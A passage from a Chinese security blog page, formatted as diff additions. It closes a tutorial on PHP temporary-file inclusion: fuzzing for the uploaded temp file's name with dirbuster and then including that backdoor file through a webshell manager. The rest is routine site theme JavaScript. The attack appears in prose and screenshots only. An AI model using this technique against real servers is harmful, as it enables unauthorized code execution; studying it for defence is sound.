+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">基于Go开发：gobuster     https://github.com/OJ/gobuster</span><br><span class="line">基于Java开发：dirbuster  OWASP杰出工具 kali自带</span><br><span class="line">基于Python开发：wfuzz    https://github.com/xmendez/wfuzz</span><br></pre></td></tr></table></figure>
+
+<p>fuzz测试，配置参数，我这里使用的是Kali自带的 <code>dirbuster</code>进行模糊测试</p>
+<p><img src="https://p5.ssl.qhimg.com/t015dfb4c192a5ae421.png" alt="img"></p>
+<p>参数设置好之后，开始进行fuzz测试</p>
+<p><img src="https://p3.ssl.qhimg.com/t01b4dac778a83e1e4f.png" alt="img"></p>
+<p>经过一段时间的破解，即可得到上传的临时文件的文件名，同时可以在响应包中看到后门文件的恶意代码也正常解析执行。</p>
+<p><strong>Getshell</strong></p>
+<p>拿到我们上传的恶意临时文件的文件名之后就可以进行包含利用，同样，我们上传的恶意临时文件没有被删除，使用Webshell管理工具对<code>php2EFF.tmp</code>后门文件进行包含利用。</p>
+<p><img src="https://p1.ssl.qhimg.com/t017b97508bb73b833f.png" alt="img"></p>
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2026/07/21/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">宽字节注入</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2026/07/03/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/">无列名注入</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">Yu9991n9</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1">Stellar 1.33.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-text">目录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E5%90%8D%E8%A7%84%E5%88%99%EF%BC%9A"><span class="toc-text">命名规则：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%EF%BC%9APHPINFO"><span class="toc-text">0x02：PHPINFO():</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-text">漏洞分析：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-text">漏洞利用：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-text">利用原理：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-text">利用过程：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-text">简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-text">临时文件是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E7%9B%AE%E5%BD%95"><span class="toc-text">存储目录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#linux"><span class="toc-text">linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows"><span class="toc-text">windows</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%91%BD%E5%90%8D%E8%A7%84%E5%88%99"><span class="toc-text">临时文件命名规则</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#linux-1"><span class="toc-text">linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-1"><span class="toc-text">windows</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHPINFO%E7%89%B9%E6%80%A7"><span class="toc-text">PHPINFO特性</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Segment-Fault"><span class="toc-text">Segment Fault</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload"><span class="toc-text">Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%8E%AF%E5%A2%83"><span class="toc-text">代码环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    // applyThemeToGiscus(theme)
+  }
+
+  // FIXME: 这会导致无法使用 preferred_color_scheme 以外的主题
+  const applyThemeToGiscus = (theme) => {
+    // theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    utils.dark.mode = newTheme === 'auto' ? (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light") : newTheme;
+    utils.dark.method.toggle.start();
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      utils.dark.mode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+    }
+    utils.dark.method.toggle.start();
+  })()
+</script>
+
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const memos = document.getElementsByClassName('ds-memos');
+    if (memos != undefined && memos.length > 0) {
+      needFancybox = true;
+    }
+    const fancybox = document.getElementsByClassName('with-fancybox');
+    if (fancybox != undefined && fancybox.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
